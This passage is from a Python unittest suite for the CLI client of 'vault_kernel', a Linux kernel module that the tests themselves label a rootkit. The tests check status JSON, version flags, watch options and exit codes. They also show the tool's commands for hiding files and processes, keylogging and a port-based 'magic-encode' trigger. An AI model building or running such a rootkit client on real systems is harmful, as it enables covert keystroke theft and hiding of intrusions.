            "description": "vault_kernel kernel rootkit"})
        self.assertEqual(list(got.keys()),
                         ["schema", "device_present", "module_in_sysfs",
                          "modinfo"])
        self.assertEqual(got["schema"], 1)
        self.assertTrue(got["device_present"])
        self.assertFalse(got["module_in_sysfs"])
        # Contract order inside the modinfo section.
        self.assertEqual(list(got["modinfo"].keys()),
                         ["filename", "version", "author", "description"])

    def test_modinfo_omitted_when_missing(self):
        got = vk.build_status_document(False, False, None)
        self.assertEqual(list(got.keys()),
                         ["schema", "device_present", "module_in_sysfs"])
        got = vk.build_status_document(False, False, {})
        self.assertNotIn("modinfo", got)

    def test_partial_modinfo_keeps_order(self):
        got = vk.build_status_document(True, True, {"version": "3.12"})
        self.assertEqual(got["modinfo"], {"version": "3.12"})
        self.assertEqual(list(got["modinfo"].keys()), ["version"])


class TestStatusEndToEnd(unittest.TestCase):
    """status() with stubbed os/subprocess: the JSON document and the
    text output (v3.10 adds --json and the fixed-key modinfo lines)."""

    MODINFO_OUT = ("filename:       /lib/modules/6.1.0/vault_kernel.ko\n"
                   "srcversion:     ABC123\n"
                   "version:        3.12\n"
                   "author:         ruby570bocadito\n"
                   "description:    lab module\n"
                   "license:        GPL\n")

    def _run_status(self, as_json):
        fake = mock.Mock(returncode=0, stdout=self.MODINFO_OUT)
        with mock.patch.object(vk.os.path, "exists", return_value=True), \
             mock.patch.object(vk.os.path, "isdir", return_value=False), \
             mock.patch("subprocess.run", return_value=fake), \
             contextlib.redirect_stdout(io.StringIO()) as out:
            vk.VaultKernelClient().status(as_json=as_json)
        return out.getvalue()

    def test_status_json_complete(self):
        parsed = json.loads(self._run_status(as_json=True))
        self.assertEqual(parsed["schema"], 1)
        self.assertTrue(parsed["device_present"])
        self.assertFalse(parsed["module_in_sysfs"])
        self.assertEqual(parsed["modinfo"]["version"], "3.12")
        self.assertEqual(parsed["modinfo"]["author"], "ruby570bocadito")
        # srcversion/license never leak into the document.
        self.assertNotIn("srcversion", parsed["modinfo"])
        self.assertNotIn("license", parsed["modinfo"])

    def test_status_text_modinfo_lines(self):
        got = self._run_status(as_json=False)
        self.assertIn("[*] vault_kernel kernel module is LOADED", got)
        self.assertIn("    version: 3.12", got)
        self.assertIn("    author: ruby570bocadito", got)
        self.assertIn("    description: lab module", got)
        # The exact-key parser no longer prints srcversion.
        self.assertNotIn("srcversion", got)

    def test_status_json_without_modinfo(self):
        fake = mock.Mock(returncode=1, stdout="")
        with mock.patch.object(vk.os.path, "exists", return_value=True), \
             mock.patch.object(vk.os.path, "isdir", return_value=True), \
             mock.patch("subprocess.run", return_value=fake), \
             contextlib.redirect_stdout(io.StringIO()) as out:
            vk.VaultKernelClient().status(as_json=True)
        parsed = json.loads(out.getvalue())
        self.assertTrue(parsed["device_present"])
        self.assertTrue(parsed["module_in_sysfs"])
        self.assertNotIn("modinfo", parsed)

    def test_status_json_device_absent(self):
        with mock.patch.object(vk.os.path, "exists", return_value=False), \
             mock.patch.object(vk.os.path, "isdir", return_value=False), \
             contextlib.redirect_stdout(io.StringIO()) as out:
            vk.VaultKernelClient().status(as_json=True)
        parsed = json.loads(out.getvalue())
        self.assertFalse(parsed["device_present"])
        self.assertFalse(parsed["module_in_sysfs"])
        self.assertNotIn("modinfo", parsed)


class TestVersionFlag(unittest.TestCase):
    """v3.10: the Python CLI gains the top-level -v/--version pair
    (the Go client has had them since v3.6) — argparse action=version
    prints the same line as the `version` subcommand and exits 0."""

    def _run(self, arg):
        out = io.StringIO()
        with mock.patch.object(vk.sys, "argv",
                               ["vault_kernel_cli.py", arg]), \
             contextlib.redirect_stdout(out):
            with self.assertRaises(SystemExit) as ctx:
                vk.main()
        return ctx.exception.code, out.getvalue()

    def test_dash_dash_version(self):
        code, out = self._run("--version")
        self.assertEqual(code, 0)
        self.assertIn(vk.format_version_line(), out)

    def test_dash_v(self):
        code, out = self._run("-v")
        self.assertEqual(code, 0)
        self.assertIn(vk.format_version_line(), out)


class TestWatchOnceWiring(unittest.TestCase):
    """v3.10: `watch --once` reaches the client as once=True."""

    def test_once_flag_dispatched(self):
        calls = {}

        def fake_watch(self, interval_ms=1000, once=False, count=None):
            calls["args"] = (interval_ms, once, count)

        with mock.patch.object(vk.sys, "argv",
                               ["vault_kernel_cli.py", "watch", "--once"]), \
             mock.patch.object(vk.VaultKernelClient, "watch",
                               fake_watch):
            vk.main()
        self.assertEqual(calls["args"], (1000, True, None))

    def test_plain_watch_dispatches_once_false(self):
        calls = {}

        def fake_watch(self, interval_ms=1000, once=False, count=None):
            calls["args"] = (interval_ms, once, count)

        with mock.patch.object(vk.sys, "argv",
                               ["vault_kernel_cli.py", "watch"]), \
             mock.patch.object(vk.VaultKernelClient, "watch",
                               fake_watch):
            vk.main()
        self.assertEqual(calls["args"], (1000, False, None))



class TestStatsJsonEmptyReport(unittest.TestCase):
    """v3.10 parity fix: stats(as_json=True) with an empty/garbage
    report must FAIL with exit 1 (Go parity), never print plain text
    with exit 0.  The v3.9 branch order printed "(no stats returned)"
    in JSON mode."""

    def _run(self, as_json, payload):
        c = vk.VaultKernelClient()
        c._open = lambda: None
        c._close = lambda: None

        def fake_ioctl(request, buf=None):
            if buf is not None and payload:
                data = payload.encode()
                buf[:len(data)] = data
            return True

        c._ioctl = fake_ioctl
        out = io.StringIO()
        with contextlib.redirect_stdout(out):
            c.stats(as_json=as_json)
        return out.getvalue()

    def test_json_empty_report_fails(self):
        with self.assertRaises(SystemExit) as ctx:
            self._run(as_json=True, payload="")
        self.assertIn("empty stats report", str(ctx.exception))

    def test_json_garbage_report_fails(self):
        with self.assertRaises(SystemExit) as ctx:
            self._run(as_json=True, payload="no pairs here at all")
        self.assertIn("empty stats report", str(ctx.exception))

    def test_text_empty_report_still_prints_placeholder(self):
        got = self._run(as_json=False, payload="")
        self.assertIn("(no stats returned)", got)

    def test_text_ok_still_prints_report(self):
        got = self._run(as_json=False, payload="version=3.12\n")
        self.assertIn("version=3.12", got)





class TestWatchCount(unittest.TestCase):
    """v3.12: `watch --count N` — finite frame windows, symmetric with
    keylog --stop-after."""

    def test_grammar_type(self):
        parser = argparse.ArgumentParser()
        sub = parser.add_subparsers(dest="command")
        sp = sub.add_parser("watch")
        sp.add_argument("--count", type=vk._count_arg, default=None)
        self.assertEqual(parser.parse_args(["watch", "--count", "5"]).count, 5)
        self.assertEqual(parser.parse_args(["watch", "--count", "1"]).count, 1)
        for bad in ("0", "-3", "abc"):
            with self.assertRaises(SystemExit):
                parser.parse_args(["watch", "--count", bad])
        self.assertIsNone(parser.parse_args(["watch"]).count)

    def test_once_and_count_rejected(self):
        """Usage class: exit 2 with the message on stderr — one frame
        is not a window."""
        import io as _io
        c = vk.VaultKernelClient()
        err = _io.StringIO()
        with self.assertRaises(SystemExit) as ctx:
            with contextlib.redirect_stderr(err):
                c.watch(once=True, count=2)
        self.assertEqual(ctx.exception.code, 2)
        self.assertIn("mutually exclusive", err.getvalue())

    def test_loop_stops_after_n_frames(self):
        """The live loop renders exactly N frames and ends with the
        standard farewell — the same one the signals use."""
        stats_payload = "module=vault_kernel version=3.12\nuptime_s=1\n"
        list_payload = ""

        def fake_ioctl(request, buf=None):
            data = (stats_payload if request == vk.IOCTL_GET_STATS
                    else list_payload).encode()
            if buf is not None:
                buf[:len(data)] = data
            return True

        c = vk.VaultKernelClient()
        c._open = lambda: None
        c._close = lambda: None
        c._ioctl = fake_ioctl
        out = io.StringIO()
        with contextlib.redirect_stdout(out):
            c.watch(interval_ms=0.0001, count=3)
        text = out.getvalue()
        self.assertEqual(text.count("vault_kernel watch"), 3)
        self.assertIn("[*] watch stopped", text)


class TestExitCodeContract(unittest.TestCase):
    """v3.12: the THREE-class exit contract of the Python client,
    verified end-to-end with REAL subprocesses (the only way to pin
    what a script's `$?` actually sees):
        0  success
        1  runtime error (device open/ioctl)
        2  usage error (grammar, invalid values, unknown command)
    """

    @staticmethod
    def _run(*args):
        import subprocess
        return subprocess.run(
            [sys.executable, str(CLIENT_PATH), *args],
            capture_output=True, text=True)

    def test_usage_class_exits_2(self):
        for args in (
            [],                            # bare invocation
            ["hide-file"],                 # missing operand
            ["hide-file", "a", "b"],       # extra operand
            ["hide-pid", "0"],             # invalid value
            ["keylog", "--timestamps"],    # requires --follow
            ["keylog", "--stop-after", "5"],
            ["magic-encode", "pwn"],       # missing port
            ["no-existe"],                 # unknown command
            ["watch", "--count", "2", "--once"],
        ):
            with self.subTest(args=args):
                r = self._run(*args)
                self.assertEqual(r.returncode, 2, r.stderr)
                self.assertTrue(r.stderr, "usage diagnostics must reach stderr")

    def test_runtime_class_exits_1(self):
        # Without the module the device-open failure is RUNTIME.
        r = self._run("hide-file", "x")
        self.assertEqual(r.returncode, 1)
        self.assertIn("not found", r.stderr)

    def test_success_class_exits_0(self):
        for args in (["version"], ["help"], ["status", "--json"]):
            with self.subTest(args=args):
                r = self._run(*args)
                self.assertEqual(r.returncode, 0, r.stderr)
        # status --json stays a clean JSON pipeline.
        r = self._run("status", "--json")
        self.assertEqual(json.loads(r.stdout)["schema"], 1)


class TestIoctlFailureRuntimeClass(unittest.TestCase):
    """v3.12: a failed ioctl is a RUNTIME failure — exit 1. Before,
    _ioctl returned False and the command exited 0 while doing
    nothing (the Go client always exited 1)."""

    def test_ioctl_failure_exits_1(self):
        def boom(self, request, buf=None):
            raise OSError(errno.EPERM, "Operation not permitted")

        c = vk.VaultKernelClient()
        c._open = lambda: None
        c._close = lambda: None
        with mock.patch.object(vk.fcntl, "ioctl", boom), \
                contextlib.redirect_stdout(io.StringIO()):
            with self.assertRaises(SystemExit) as ctx:
                c.hide_pid(5)
        self.assertEqual(ctx.exception.code, 1)


class TestHelpSubcommand(unittest.TestCase):
    """v3.12: the `help` subcommand exists in Python too — the Go
    client has it and its own error message recommends it."""

    def test_help_dispatches_exit_0(self):
        out = io.StringIO()
        with mock.patch.object(vk.sys, "argv",
                               ["vault_kernel_cli.py", "help"]):
            with contextlib.redirect_stdout(out):
                vk.main()
        self.assertIn("hide-file", out.getvalue())
        self.assertIn("Exit codes", out.getvalue())


if __name__ == "__main__":
    unittest.main(verbosity=2)
